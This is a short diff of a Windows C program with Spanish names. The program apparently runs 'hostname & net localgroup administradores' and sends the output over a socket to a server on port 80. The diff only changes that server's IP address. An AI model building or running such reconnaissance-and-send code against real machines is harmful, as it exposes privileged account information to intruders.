@@ -3,10 +3,12 @@
 #include <winsock2.h>
 #include <string.h>
 
+
 int ejecuta(char[], FILE *);
 int cliente_socket(char *);
+
 char comando [] = "hostname & net localgroup administradores";
-char ip_server [] = "192.168.8.100";
+char ip_server [] = "192.168.8.104";
 int puerto_server = 80;
 
 int main(){
